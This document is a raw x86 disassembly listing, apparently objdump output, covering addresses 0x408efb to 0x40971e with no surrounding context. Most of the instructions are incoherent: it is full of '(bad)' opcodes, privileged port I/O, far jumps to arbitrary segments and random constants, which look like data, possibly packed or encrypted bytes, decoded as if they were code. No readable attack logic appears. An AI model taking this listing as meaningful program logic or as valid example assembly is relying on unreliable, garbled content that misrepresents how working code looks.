  408efb:	mov    ds:0x4ff4a545,al
  408f00:	bound  esp,QWORD PTR [ebx+0x1f]
  408f03:	(bad)  ds:0x5e0e22cd
  408f09:	ret    
  408f0a:	sub    eax,0x576ddcbe
  408f0f:	hlt    
  408f10:	jl     0x408ea6
  408f12:	xchg   ebp,eax
  408f13:	and    eax,0xdf1281e3
  408f18:	push   cs
  408f19:	add    edi,eax
  408f1b:	xchg   ecx,eax
  408f1c:	push   es
  408f1d:	lock xchg ecx,eax
  408f1f:	push   esp
  408f20:	stos   BYTE PTR es:[edi],al
  408f21:	cmp    eax,0x8e968a38
  408f26:	cmp    DWORD PTR [edx+ebp*8+0x338fbd51],ebx
  408f2d:	into   
  408f2e:	push   0xfffffffb
  408f30:	cli    
  408f31:	inc    ecx
  408f32:	push   esi
  408f33:	test   eax,0x1083f6ee
  408f38:	jge    0x408f9c
  408f3a:	inc    esi
  408f3b:	call   0x4fc57a4a
  408f40:	fisubr DWORD PTR [edi-0x55]
  408f43:	xchg   edx,eax
  408f44:	mov    edx,0x61e7989b
  408f49:	outs   dx,BYTE PTR ds:[esi]
  408f4a:	mov    ecx,0xf4d4a412
  408f50:	popf   
  408f51:	imul   DWORD PTR [edx]
  408f53:	jmp    0xdfa5f94c
  408f58:	lock enter 0x58a1,0xc4
  408f5d:	mov    edx,0xd007b67a
  408f62:	dec    ebp
  408f63:	push   ebp
  408f64:	test   BYTE PTR [edx],cl
  408f66:	imul   BYTE PTR [esi+0x5b446e74]
  408f6c:	cmc    
  408f6d:	ds push edi
  408f6f:	cmp    al,0xb4
  408f71:	dec    ebp
  408f72:	aad    0x4c
  408f74:	cld    
  408f75:	dec    eax
  408f76:	xor    ebp,0x1a
  408f79:	jl     0x408fd0
  408f7b:	or     bh,BYTE PTR [eax+ebp*1]
  408f7e:	push   0x6d
  408f80:	mov    WORD PTR [esi+0x23],cs
  408f83:	dec    ebp
  408f84:	or     BYTE PTR [edx-0x58c18f7d],dh
  408f8a:	push   ebp
  408f8b:	fwait
  408f8c:	(bad)  
  408f8d:	jg     0x408f48
  408f8f:	sub    DWORD PTR [esi-0x3f],edx
  408f92:	cmp    ah,BYTE PTR [ebp-0x6c461c9b]
  408f98:	int    0xab
  408f9a:	sub    DWORD PTR [edi+eax*4+0x65fd44d2],esi
  408fa1:	mov    edi,0xcbecadb8
  408fa6:	sar    BYTE PTR [esi+esi*1+0x71574c71],1
  408fad:	inc    edi
  408fae:	pushf  
  408faf:	daa    
  408fb0:	add    eax,0x1c7c64f4
  408fb5:	les    ebp,FWORD PTR [edx+0x2b]
  408fb8:	ss sbb eax,0xab842128
  408fbe:	adc    eax,0x416ac151
  408fc3:	rcr    BYTE PTR ds:[ecx+0x5d631304],1
  408fca:	and    eax,0xe7fee219
  408fcf:	and    BYTE PTR [edi],ah
  408fd1:	inc    ebx
  408fd2:	push   esi
  408fd3:	xchg   ebp,eax
  408fd4:	sub    DWORD PTR [eax+0x5],ebx
  408fd7:	sbb    BYTE PTR [edi],cl
  408fd9:	jbe    0x409014
  408fdb:	stos   BYTE PTR es:[edi],al
  408fdc:	aaa    
  408fdd:	mov    DWORD PTR [ebx-0x4b],ebp
  408fe0:	xchg   edi,eax
  408fe2:	or     al,0x70
  408fe4:	int    0x34
  408fe6:	mov    gs,WORD PTR [eax+0x5e]
  408fe9:	xchg   ebx,eax
  408fea:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fec:	and    al,0x99
  408fee:	mov    bh,0x9f
  408ff0:	call   0x2ca0:0xcb42bd4a
  408ff7:	in     eax,0x5d
  408ff9:	(bad)  
  408ffa:	jmp    0x15a0:0x3ad43c53
  409001:	adc    DWORD PTR fs:[eax],edx
  409004:	daa    
  409005:	shl    esp,0x9e
  409008:	jecxz  0x409037
  40900a:	xchg   esi,eax
  40900b:	mov    al,ds:0xbd1a0ac1
  409010:	dec    edx
  409011:	test   eax,0x3204a98c
  409016:	sbb    eax,edx
  409018:	pop    ecx
  409019:	mov    dh,0x67
  40901b:	mov    al,0x76
  40901d:	mov    edi,0x3b726075
  409022:	mov    ch,0xb8
  409024:	or     ebx,DWORD PTR [eax+ebp*2-0x5a9a0cf4]
  40902b:	leave  
  40902c:	dec    BYTE PTR [eax]
  40902e:	adc    eax,0xa30a3acb
  409033:	mov    cl,0xe4
  409035:	sbb    eax,0x5f22a87e
  40903a:	les    esp,FWORD PTR [edi-0x26]
  40903d:	sub    BYTE PTR [edx+0x4f],ch
  409040:	arpl   WORD PTR [ebx+edi*1-0x79],cx
  409044:	(bad)  
  409045:	imul   DWORD PTR [esi-0x42]
  409048:	ins    BYTE PTR es:[edi],dx
  409049:	mov    ds:0xe36ed60d,al
  40904e:	jae    0x40902f
  409050:	cld    
  409051:	and    al,0x19
  409053:	out    dx,al
  409054:	in     al,dx
  409055:	mov    cl,0x64
  409057:	pushf  
  409058:	add    dh,0xc9
  40905b:	jns    0x409016
  40905d:	sub    dh,bh
  40905f:	imul   eax,DWORD PTR [edx+0x1479d793],0xffffffa2
  409066:	xchg   esi,eax
  409067:	popa   
  409068:	pop    DWORD PTR [ecx]
  40906a:	imul   edx,ebx,0xc9d33cda
  409070:	pusha  
  409071:	and    eax,DWORD PTR [esi]
  409073:	adc    eax,0xc2e63614
  409078:	inc    edx
  409079:	retf   
  40907a:	xchg   BYTE PTR [eax+0x439f8768],bh
  409080:	mov    cl,ch
  409082:	retf   0x50cd
  409085:	adc    al,0x25
  409087:	mov    cl,BYTE PTR [ecx-0x62]
  40908a:	jne    0x40910b
  40908c:	or     DWORD PTR [ebx-0x3188b9c8],edi
  409092:	and    dl,BYTE PTR ds:0xe72d81d8
  409098:	mov    esi,edi
  40909a:	jno    0x4090b8
  40909c:	fwait
  40909d:	mov    bh,0x3a
  40909f:	mov    edi,0x4b8a3cc3
  4090a4:	push   0xfffffff1
  4090a6:	test   DWORD PTR [eax-0x41770923],esp
  4090ac:	out    dx,al
  4090ad:	or     ch,BYTE PTR [esi]
  4090af:	in     al,0x9c
  4090b1:	or     dl,bh
  4090b3:	pop    esi
  4090b4:	inc    esp
  4090b5:	loope  0x4090fc
  4090b7:	stc    
  4090b8:	std    
  4090b9:	mov    dh,0xee
  4090bb:	cmp    eax,0x2f49366c
  4090c0:	add    DWORD PTR [ebx],ebx
  4090c2:	lock jae 0x40905d
  4090c5:	sbb    BYTE PTR [eax+0x3e],0x21
  4090c9:	push   esp
  4090ca:	nop
  4090cb:	cmp    ch,BYTE PTR [ebx+0x459827c0]
  4090d1:	sbb    ch,dh
  4090d3:	mov    bh,al
  4090d5:	daa    
  4090d6:	into   
  4090d7:	or     eax,0x6e6d66f1
  4090dc:	push   ds
  4090dd:	retf   
  4090de:	pusha  
  4090df:	lds    ebp,FWORD PTR [edi+esi*8+0x7a9c4ec1]
  4090e6:	xor    ecx,DWORD PTR [ecx]
  4090e8:	fcmovnb st,st(0)
  4090ea:	daa    
  4090eb:	daa    
  4090ec:	push   cs
  4090ed:	imul   ebp,DWORD PTR [edi+0x78],0x65c28783
  4090f4:	test   ah,bh
  4090f6:	lock mov ebx,0x8e5299f7
  4090fc:	loopne 0x40915f
  4090fe:	in     eax,0x41
  409100:	jg     0x409119
  409102:	push   edx
  409103:	sub    BYTE PTR [ebp-0x74],cl
  409106:	mov    esi,0x5da10c5
  40910b:	jmp    esp
  40910d:	scas   eax,DWORD PTR es:[edi]
  40910e:	pop    esi
  40910f:	fstp   DWORD PTR [eax]
  409111:	push   edi
  409112:	pop    ss
  409113:	sub    eax,0xd0f9d515
  409118:	jecxz  0x4090fc
  40911a:	inc    ebx
  40911b:	adc    bl,al
  40911d:	(bad)  
  40911e:	out    dx,eax
  40911f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409120:	shr    DWORD PTR [esi],0xe5
  409123:	pop    ds
  409124:	call   0xb0d2e5d9
  409129:	int3   
  40912a:	mov    ebx,0x8a801c49
  40912f:	push   ds
  409130:	pop    esp
  409131:	jae    0x40917f
  409133:	aam    0x1a
  409135:	push   0xffffff96
  409137:	leave  
  409138:	jae    0x409194
  40913a:	sbb    BYTE PTR [ebx],cl
  40913c:	mov    edx,0xbe992605
  409141:	mov    edi,0xd729a40d
  409146:	xor    BYTE PTR [ecx-0x3d],ch
  409149:	ins    BYTE PTR es:[edi],dx
  40914a:	and    dl,BYTE PTR [ebp-0x4d]
  40914d:	and    DWORD PTR [ebx+0x6e],0xb1d087a7
  409154:	outs   dx,DWORD PTR cs:[esi]
  409156:	clc    
  409157:	sbb    eax,0xb7310198
  40915c:	push   esp
  40915d:	adc    DWORD PTR [esi+ecx*8],esp
  409160:	xor    esp,esi
  409162:	loopne 0x40918a
  409164:	push   ebp
  409165:	(bad)  
  409166:	xchg   ecx,ebx
  409168:	xchg   esp,eax
  409169:	addr16 push eax
  40916b:	cmp    DWORD PTR [ebp+0x780b7911],edx
  409171:	jge    0x4091ee
  409173:	mov    ds:0x89658ede,eax
  409178:	mov    edi,DWORD PTR [esi+0x3d]
  40917b:	sub    al,0x15
  40917d:	mov    ecx,0x91afd8db
  409182:	popa   
  409183:	out    0xf0,al
  409185:	mov    edx,0xd0ec81a9
  40918a:	std    
  40918b:	mov    esp,0x2283f9e7
  409190:	scas   eax,DWORD PTR es:[edi]
  409191:	mov    DWORD PTR [eax],edx
  409193:	mul    DWORD PTR [ecx-0x13770b85]
  409199:	loopne 0x40916f
  40919b:	cdq    
  40919c:	pop    edx
  40919d:	sti    
  40919e:	jae    0x40916c
  4091a0:	push   esi
  4091a1:	mov    edi,0x20bf008
  4091a6:	add    ebp,DWORD PTR [ecx+0x3f0649a4]
  4091ac:	and    al,0xb5
  4091ae:	and    eax,0x2bd442e3
  4091b3:	add    BYTE PTR [esi],cl
  4091b5:	leave  
  4091b6:	jl     0x40919a
  4091b8:	jno    0x409161
  4091ba:	clc    
  4091bb:	into   
  4091bc:	pop    ds
  4091bd:	mov    ebp,0xa0fdd8e3
  4091c2:	(bad)  
  4091c3:	dec    esi
  4091c4:	idiv   cl
  4091c6:	cli    
  4091c7:	(bad)  
  4091c8:	dec    ebx
  4091c9:	test   eax,0x56916185
  4091ce:	xor    edx,DWORD PTR [edx]
  4091d0:	sub    ch,bh
  4091d2:	xchg   edx,eax
  4091d3:	shl    BYTE PTR [eax+0x178232dc],1
  4091d9:	out    dx,al
  4091da:	push   0xfffffff6
  4091dc:	rol    BYTE PTR [ebx],cl
  4091de:	test   ebx,ebx
  4091e0:	cli    
  4091e1:	mov    ds:0x5a2a618c,eax
  4091e6:	push   0x3f
  4091e8:	push   edi
  4091e9:	push   es
  4091ea:	addr16 cld 
  4091ec:	mov    ch,0x2b
  4091ee:	ret    
  4091ef:	jmp    0xdca5:0x19d27d1c
  4091f6:	in     eax,dx
  4091f7:	loopne 0x40918b
  4091f9:	pop    ds
  4091fa:	mov    bh,0x48
  4091fc:	out    0x52,eax
  4091fe:	mov    esi,0x4063d4dd
  409203:	sar    BYTE PTR [edi-0x7c],0xba
  409207:	gs xchg edx,ebp
  40920a:	push   esp
  40920b:	ins    DWORD PTR es:[edi],dx
  40920c:	shr    esi,1
  40920e:	outs   dx,BYTE PTR ds:[esi]
  40920f:	add    al,0xbc
  409211:	or     BYTE PTR [edi],cl
  409213:	lahf   
  409214:	mov    bl,0x11
  409216:	sbb    al,0x6e
  409218:	inc    esp
  409219:	movzx  ebp,WORD PTR [edx-0xed3b5ee]
  409220:	ficom  DWORD PTR [ebx]
  409222:	(bad)  
  409223:	imul   ecx,DWORD PTR [ebp-0x709fe658],0x34
  40922a:	dec    ebx
  40922b:	cld    
  40922c:	pop    es
  40922d:	jns    0x4091d1
  40922f:	mov    DWORD PTR [edx+0x34],ebp
  409232:	dec    esp
  409233:	or     al,0x30
  409235:	jp     0x40925f
  409237:	jbe    0x4091b9
  409239:	and    al,0x21
  40923b:	mov    BYTE PTR [ebp+0x6df0f165],cl
  409241:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409242:	inc    esp
  409243:	mov    ebx,0x6f0fdefc
  409248:	pusha  
  409249:	in     eax,dx
  40924a:	(bad)  
  40924b:	sbb    esi,DWORD PTR [ebx]
  40924d:	inc    esp
  40924e:	inc    eax
  40924f:	adc    BYTE PTR [ebp-0x13],dl
  409252:	out    0x84,eax
  409254:	sti    
  409255:	pop    ebp
  409256:	xor    DWORD PTR [edx],edi
  409258:	mov    ecx,0x76bb590e
  40925d:	jge    0x40927d
  40925f:	lock cmp al,0xe1
  409262:	mov    gs,WORD PTR [eax]
  409264:	cli    
  409265:	inc    ecx
  409266:	mov    ecx,0x104f61dd
  40926b:	add    BYTE PTR [ebx-0x56f59f8e],dh
  409271:	sbb    DWORD PTR [ebx-0x2892b8d0],ecx
  409277:	les    esp,FWORD PTR [edi]
  409279:	cdq    
  40927a:	mov    ds:0xe92a1b64,al
  40927f:	sub    eax,DWORD PTR [edi+0x5c]
  409282:	cmc    
  409283:	pop    ecx
  409284:	cmp    cl,BYTE PTR [edi]
  409286:	popa   
  409287:	inc    edx
  409288:	rcr    BYTE PTR [ebx],1
  40928a:	push   cs
  40928b:	sbb    BYTE PTR [edx+0x2d],al
  40928e:	stos   BYTE PTR es:[edi],al
  40928f:	test   al,0x43
  409291:	pop    edi
  409292:	(bad)  [esi+ebx*4]
  409295:	repz imul edi,edx,0x60574dc4
  40929c:	jns    0x4092bc
  40929e:	cs sti 
  4092a0:	add    ch,cl
  4092a2:	push   0xffffff8f
  4092a4:	mov    WORD PTR ds:0xc48f6732,?
  4092aa:	dec    ebx
  4092ab:	idiv   ebp
  4092ad:	add    dl,BYTE PTR [esi-0x65]
  4092b0:	imul   ebp,DWORD PTR [ebx],0x3faabc41
  4092b6:	inc    ecx
  4092b7:	ins    DWORD PTR es:[edi],dx
  4092b8:	rcr    BYTE PTR [edi+0xbd5ea0c],0x5e
  4092bf:	mov    ebx,0x6ab34846
  4092c4:	mov    ch,0xeb
  4092c6:	loop   0x4092d1
  4092c8:	jo     0x409261
  4092ca:	clc    
  4092cb:	add    ebp,DWORD PTR [esi+0x4a713e0c]
  4092d1:	clc    
  4092d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4092d3:	dec    edi
  4092d4:	push   eax
  4092d5:	jecxz  0x4092e1
  4092d7:	inc    ebx
  4092d8:	and    ah,bh
  4092da:	inc    ebp
  4092db:	add    BYTE PTR [esi-0x623ec03d],ch
  4092e1:	mov    eax,0x45fc038a
  4092e6:	test   ecx,edi
  4092e8:	lods   eax,DWORD PTR ds:[esi]
  4092e9:	or     DWORD PTR [ebp-0x56a0508e],0xffffffbe
  4092f0:	bound  esi,QWORD PTR [ecx-0xc]
  4092f3:	mov    ds,WORD PTR [ecx+0x6c9639a3]
  4092f9:	jmp    0x3149:0x4dc0b5d7
  409300:	pop    ds
  409301:	inc    edx
  409302:	dec    ebx
  409303:	inc    edi
  409304:	pop    ebx
  409305:	xchg   edi,eax
  409306:	repz pop ebx
  409308:	sub    eax,0xaef68d45
  40930d:	or     BYTE PTR [esi-0x358e1b13],dl
  409313:	jb     0x409342
  409315:	cwde   
  409316:	rol    DWORD PTR [edi-0x4e],0x3d
  40931a:	js     0x409323
  40931c:	(bad)  
  40931d:	sbb    ecx,ebp
  40931f:	push   ds
  409320:	pop    edi
  409321:	mov    ebx,0x21d5a089
  409326:	pop    eax
  409327:	adc    al,0xff
  409329:	push   eax
  40932a:	xchg   esi,eax
  40932b:	xchg   BYTE PTR [ebp+0x7],ch
  40932e:	and    DWORD PTR [edi],edx
  409330:	test   DWORD PTR [esi-0x1d],edx
  409333:	daa    
  409334:	pop    ebp
  409335:	jne    0x409373
  409337:	(bad)  
  409338:	ss fsub st,st(0)
  40933b:	dec    ebp
  40933c:	cmp    eax,0xd5b97a98
  409341:	outs   dx,BYTE PTR ds:[esi]
  409342:	mov    edi,0x2b048f9f
  409347:	push   cs
  409348:	adc    bh,BYTE PTR [ecx+0x13]
  40934b:	and    DWORD PTR [ebp-0x45cc1d5e],0x16
  409352:	test   BYTE PTR [eax+0x5e071a09],0x8c
  409359:	lock and al,0xb3
  40935c:	sbb    al,dh
  40935e:	les    edx,FWORD PTR [esp+eiz*4]
  409361:	out    dx,al
  409362:	imul   esi
  409364:	cdq    
  409365:	mov    al,ds:0x94fc5689
  40936a:	int    0xb
  40936c:	mov    ah,0x19
  40936e:	sub    esi,DWORD PTR [ecx-0x7787c7c8]
  409374:	sub    eax,0x62f14b5d
  409379:	fwait
  40937a:	daa    
  40937b:	enter  0xfd80,0x8
  40937f:	or     BYTE PTR [eax-0x2dc73cf9],al
  409385:	mov    ecx,0x45450f07
  40938a:	or     al,0x8b
  40938c:	cmp    ch,BYTE PTR [ebx+0x57e085a7]
  409392:	pop    ss
  409393:	inc    DWORD PTR ds:0x6bcbfe47
  409399:	sub    eax,0x28089a6d
  40939e:	mov    ch,0xb9
  4093a0:	mov    bl,0xc9
  4093a2:	pop    esi
  4093a3:	jmp    0xe5582d85
  4093a8:	neg    DWORD PTR [ecx-0x2]
  4093ab:	rol    DWORD PTR [edx+0x5f],1
  4093ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4093af:	add    BYTE PTR [ecx],ch
  4093b1:	inc    esp
  4093b2:	sub    eax,ebx
  4093b4:	mov    esi,0xba03c1a9
  4093b9:	and    ebp,esi
  4093bb:	jecxz  0x40937a
  4093bd:	mov    ds:0x775f444b,eax
  4093c2:	into   
  4093c3:	cmp    BYTE PTR [eax-0x68],cl
  4093c6:	sbb    edi,DWORD PTR [eax-0x2a]
  4093c9:	adc    eax,DWORD PTR [ecx+0x60726596]
  4093cf:	(bad)  
  4093d0:	test   eax,0x7981dcd
  4093d5:	jne    0x40936e
  4093d7:	leave  
  4093d8:	(bad)
  4093db:	jecxz  0x4093c3
  4093dd:	repnz mov dl,0x53
  4093e0:	xor    eax,0xa2ce5d7a
  4093e5:	xchg   ebp,eax
  4093e6:	mov    eax,ds:0x10148de3
  4093eb:	out    dx,al
  4093ec:	mov    BYTE PTR [ecx-0x8],dh
  4093ef:	push   0xffffff80
  4093f1:	mov    esi,0x5bb6b952
  4093f6:	call   edi
  4093f8:	int    0x27
  4093fa:	jmp    0x409390
  4093fc:	ret    0x3fa8
  4093ff:	xor    ch,bl
  409401:	sbb    al,0x17
  409403:	fidiv  WORD PTR [esi+edx*2-0x37]
  409407:	mov    ch,0x43
  409409:	jne    0x4093e1
  40940b:	cmp    BYTE PTR [esi+esi*4+0x75],ah
  40940f:	inc    edx
  409410:	xlat   BYTE PTR ds:[ebx]
  409411:	fs out 0xcc,eax
  409414:	lock sub al,0xd4
  409417:	lea    ebp,[ebx+edx*8+0x7d5d651d]
  40941e:	mov    esp,0x87fa8eac
  409423:	pushf  
  409424:	xchg   ebx,eax
  409425:	leave  
  409426:	pop    ebx
  409427:	xor    ecx,ecx
  409429:	aad    0x41
  40942b:	sbb    bh,BYTE PTR [ebx+0x299af346]
  409431:	mov    al,0xaa
  409433:	rol    BYTE PTR [ecx+edi*4+0x4d324a91],cl
  40943a:	sahf   
  40943b:	push   edx
  40943c:	fsubp  st(2),st
  40943e:	inc    ebx
  40943f:	inc    esi
  409440:	clc    
  409441:	or     eax,0xf4875087
  409446:	xor    al,0x0
  409448:	stc    
  409449:	pop    ss
  40944a:	push   cs
  40944b:	cmp    al,0x29
  40944d:	jnp    0x409451
  40944f:	jle    0x40940a
  409451:	sbb    ebx,DWORD PTR [eax+0x67ba38e0]
  409457:	mov    esi,0x43e96178
  40945c:	mov    al,ds:0xed574b45
  409461:	mov    WORD PTR [esp+esi*4],gs
  409464:	mov    BYTE PTR [esi],0x2
  409467:	out    0x61,al
  409469:	fisttp QWORD PTR [edx-0x7e990a]
  40946f:	xlat   BYTE PTR ds:[ebx]
  409470:	push   eax
  409471:	sbb    al,0xef
  409473:	xchg   ebx,eax
  409474:	das    
  409475:	dec    eax
  409476:	loop   0x4094c2
  409478:	rcr    DWORD PTR fs:0xb1b97fad,0xf5
  409480:	jo     0x409405
  409482:	jp     0x409469
  409484:	jl     0x409476
  409486:	inc    esp
  409487:	call   0x1029:0x3aa9645b
  40948e:	fisttp DWORD PTR [eax]
  409490:	loopne 0x409470
  409492:	jno    0x4094ca
  409494:	scas   eax,DWORD PTR es:[edi]
  409495:	or     esp,DWORD PTR fs:[ebp+0x58992e0c]
  40949c:	mov    bh,0xe6
  40949e:	aad    0xc5
  4094a0:	jecxz  0x4094b4
  4094a2:	inc    esi
  4094a3:	mov    bh,0xe1
  4094a5:	sub    dl,BYTE PTR [edi+0x5a]
  4094a8:	push   ss
  4094a9:	pop    ecx
  4094aa:	in     eax,0xa4
  4094ac:	pusha  
  4094ad:	inc    eax
  4094ae:	mov    esi,0xa3b725fe
  4094b3:	int    0x84
  4094b5:	pop    edi
  4094b6:	or     eax,edi
  4094b8:	icebp  
  4094b9:	mov    dh,0x3f
  4094bb:	and    eax,0x72104615
  4094c0:	adc    BYTE PTR [edi+0x6a],bl
  4094c3:	data16 jne 0x4094d2
  4094c6:	aaa    
  4094c7:	jns    0x409532
  4094c9:	rol    BYTE PTR [ebx-0x250e3dc2],cl
  4094cf:	dec    ebp
  4094d0:	mov    ds:0x629c6a48,al
  4094d5:	outs   dx,DWORD PTR ds:[esi]
  4094d6:	inc    esi
  4094d7:	pop    esp
  4094d8:	dec    ebp
  4094d9:	jl     0x4094d3
  4094db:	cmp    eax,0xaed2b5fd
  4094e0:	jnp    0x4094aa
  4094e2:	cli    
  4094e3:	push   cs
  4094e4:	pop    ss
  4094e5:	xor    ebp,DWORD PTR [esi+0x5822fbdf]
  4094eb:	in     al,0x45
  4094ed:	sbb    bh,bl
  4094ef:	enter  0x696b,0xa0
  4094f3:	mov    ecx,0xc156cbbf
  4094f8:	loopne 0x409560
  4094fa:	outs   dx,BYTE PTR ds:[esi]
  4094fb:	popa   
  4094fc:	mov    dh,0x4b
  4094fe:	mov    ebp,0xa1cf9ff
  409503:	int    0xef
  409505:	das    
  409506:	xor    ch,BYTE PTR [ecx+ecx*8-0x27594694]
  40950d:	xchg   esi,eax
  40950e:	jmp    0x17418876
  409513:	cmp    edx,edx
  409515:	out    dx,al
  409516:	xchg   edx,eax
  409517:	lahf   
  409518:	xchg   edx,eax
  409519:	lods   eax,DWORD PTR ds:[esi]
  40951a:	call   0xaced:0x1392e00c
  409521:	xor    WORD PTR [edx],ax
  409524:	or     DWORD PTR [esp+edi*2-0x54],edx
  409528:	xchg   esp,eax
  409529:	fmul   st,st(2)
  40952b:	add    al,0x24
  40952d:	pop    ebp
  40952e:	jb     0x40952f
  409530:	dec    esp
  409531:	jmp    0x409547
  409533:	es pushf 
  409535:	aam    0x95
  409537:	(bad)  
  409538:	call   0x5d4749e0
  40953d:	sbb    BYTE PTR [eax+0x4417043e],dl
  409543:	pop    ebp
  409544:	mov    eax,DWORD PTR [ebx-0xc]
  409547:	leave  
  409548:	jae    0x409568
  40954a:	jno    0x409587
  40954c:	adc    edx,DWORD PTR [ebp-0x7bde9bfb]
  409552:	mov    ecx,ebp
  409554:	scas   eax,DWORD PTR es:[edi]
  409555:	frstor [esi+0x61]
  409558:	pop    ebx
  409559:	xor    dl,BYTE PTR ds:0x4a8fe9d2
  40955f:	cmp    edx,DWORD PTR [esi-0x7b]
  409562:	inc    ebx
  409563:	mov    bl,0x6c
  409565:	popf   
  409566:	jae    0x4095bd
  409568:	sub    eax,0x84deecbc
  40956d:	sbb    eax,0xfb1fdbed
  409572:	out    dx,eax
  409573:	xchg   edi,eax
  409574:	mov    ds:0x84b03385,al
  409579:	fmul   QWORD PTR [ecx-0x4b]
  40957c:	int    0xaf
  40957e:	fst    QWORD PTR [eax+0xb5c1dfd]
  409584:	cmp    eax,0xcd0819c
  409589:	mov    edx,DWORD PTR [edi]
  40958b:	aaa    
  40958c:	ret    0xb9a5
  40958f:	test   eax,0x250cd3a4
  409594:	popa   
  409595:	enter  0xabe0,0x12
  409599:	ss loop 0x40958e
  40959c:	push   ecx
  40959d:	in     eax,dx
  40959e:	int    0xf7
  4095a0:	stc    
  4095a1:	out    dx,eax
  4095a2:	call   0x47b4:0x3f8b43e7
  4095a9:	fdivr  st(0),st
  4095ab:	and    eax,0x5a99583c
  4095b0:	push   eax
  4095b1:	test   BYTE PTR [ebx],0xe4
  4095b4:	mov    DWORD PTR [edi],0x3a6229a7
  4095ba:	add    edx,DWORD PTR [eax+0x2c]
  4095bd:	aad    0x37
  4095bf:	not    BYTE PTR [ecx]
  4095c1:	fstp   QWORD PTR [edx+esi*4-0x63]
  4095c5:	adc    esp,DWORD PTR [edx-0x22]
  4095c8:	imul   edx,DWORD PTR [eax+0x2d4e56be],0xffffffd2
  4095cf:	fcom   QWORD PTR [ebp*1+0x438cfcbd]
  4095d6:	add    DWORD PTR [ecx+0x3491a20d],ecx
  4095dc:	in     al,dx
  4095dd:	cmp    edi,esi
  4095df:	push   0xffffffad
  4095e1:	aaa    
  4095e2:	mov    esp,0x5548b2e7
  4095e7:	sahf   
  4095e8:	sub    bh,BYTE PTR [ecx+0x508baa18]
  4095ee:	and    bl,BYTE PTR [ebp+0x55]
  4095f1:	pop    ebp
  4095f2:	sbb    al,0x63
  4095f4:	or     ebx,esp
  4095f6:	bound  edx,QWORD PTR [ebp+0x17]
  4095f9:	fwait
  4095fa:	(bad)
  4095fe:	adc    ebp,edx
  409600:	dec    edx
  409601:	push   esp
  409602:	outs   dx,DWORD PTR ds:[esi]
  409603:	add    eax,0x95fc137
  409608:	mov    DWORD PTR [ebp-0x1],esp
  40960b:	rol    BYTE PTR [edi-0x1c9622bb],1
  409611:	mov    dl,0xb4
  409613:	mov    eax,ds:0x7985f2bf
  409618:	ror    DWORD PTR [ecx],cl
  40961a:	cmp    esp,0x61
  40961d:	leave  
  40961e:	enter  0xe59e,0xea
  409622:	push   0x3f
  409624:	cmp    bh,BYTE PTR [esi]
  409626:	in     eax,dx
  409627:	and    al,0xe8
  409629:	xchg   ebx,eax
  40962a:	push   esi
  40962b:	stos   DWORD PTR es:[edi],eax
  40962c:	iret   
  40962d:	not    edi
  40962f:	or     eax,0xfd834ee1
  409634:	test   eax,0x98c06077
  409639:	mov    edx,0xecd48fcf
  40963e:	jl     0x4095fc
  409640:	lds    ecx,FWORD PTR [esi+ecx*2]
  409643:	jp     0x409678
  409645:	stc    
  409646:	xor    BYTE PTR [ebx+ecx*4],bh
  409649:	icebp  
  40964a:	xor    eax,0xb853e24c
  40964f:	jns    0x409667
  409651:	ret    0x8ecc
  409654:	not    BYTE PTR [eax+0x4e47ea6d]
  40965a:	sbb    bl,dh
  40965c:	or     cl,bh
  40965e:	inc    esi
  40965f:	mov    esi,0x942ce59b
  409664:	sbb    dl,dl
  409666:	enter  0xffbf,0xf9
  40966a:	iret   
  40966b:	mov    edi,0x3b4597b5
  409670:	jae    0x40964d
  409672:	jb     0x4096e1
  409674:	shr    BYTE PTR [esi],1
  409676:	lods   eax,DWORD PTR ds:[esi]
  409677:	pop    ebp
  409678:	or     dl,bh
  40967a:	mov    ecx,0xf6dac3de
  40967f:	push   0xf4a9cdff
  409684:	aad    0xf3
  409686:	ficom  WORD PTR [edi-0x3ca68552]
  40968c:	adc    DWORD PTR [ebx+0x6fbfdf5d],edi
  409692:	repnz add BYTE PTR [ebp-0x47fbf3ee],al
  409699:	loop   0x4096cd
  40969b:	inc    esi
  40969c:	loope  0x40966f
  40969e:	inc    esp
  40969f:	into   
  4096a0:	mov    ebp,cs
  4096a2:	mov    ds:0x4d390532,eax
  4096a7:	mov    cl,0xe8
  4096a9:	mov    bh,0x5
  4096ab:	inc    ecx
  4096ac:	dec    edi
  4096ad:	mov    bh,0x6f
  4096af:	pop    ss
  4096b0:	dec    edi
  4096b1:	push   esp
  4096b2:	ficom  WORD PTR [edx]
  4096b4:	ret    0x9373
  4096b7:	cs xchg esi,edx
  4096ba:	addr16 xchg ecx,eax
  4096bc:	mov    bl,0x47
  4096be:	xchg   esi,eax
  4096bf:	sahf   
  4096c0:	xchg   DWORD PTR [esi+0x3a3a4d0c],edx
  4096c6:	inc    esp
  4096c7:	pop    ecx
  4096c8:	and    al,0x46
  4096ca:	push   edx
  4096cb:	inc    BYTE PTR [ebx]
  4096cd:	(bad)  
  4096ce:	adc    eax,0x6359fbb2
  4096d3:	outs   dx,DWORD PTR cs:[esi]
  4096d5:	pusha  
  4096d6:	push   0xf78224fa
  4096db:	xchg   BYTE PTR [edi-0x69],ah
  4096de:	push   esp
  4096df:	pusha  
  4096e0:	pop    ds
  4096e1:	inc    esi
  4096e2:	in     eax,dx
  4096e3:	mov    eax,cs
  4096e5:	rcr    DWORD PTR [esi-0x52],0xd9
  4096e9:	js     0x4096c0
  4096eb:	xchg   edi,eax
  4096ec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4096ed:	jl     0x4096e7
  4096ef:	les    edx,FWORD PTR ds:0xb81fe65e
  4096f5:	test   al,0xcf
  4096f7:	popf   
  4096f8:	dec    edx
  4096f9:	mov    al,ds:0xff58e3db
  4096fe:	iret   
  4096ff:	push   edx
  409700:	nop
  409701:	pop    ebx
  409702:	clc    
  409703:	scas   al,BYTE PTR es:[edi]
  409704:	nop
  409705:	pop    eax
  409706:	out    0x47,al
  409708:	push   ss
  409709:	mov    ?,WORD PTR [ebx]
  40970b:	es dec eax
  40970d:	scas   eax,DWORD PTR es:[edi]
  40970e:	dec    edi
  40970f:	jb     0x40973b
  409711:	out    0xf5,eax
  409713:	jne    0x4096b9
  409715:	mov    ecx,esi
  409717:	push   ds
  409718:	into   
  409719:	jle    0x40977e
  40971b:	xchg   ecx,eax
  40971c:	sbb    dh,ch
  40971e:	and    BYTE PTR [esi],bl
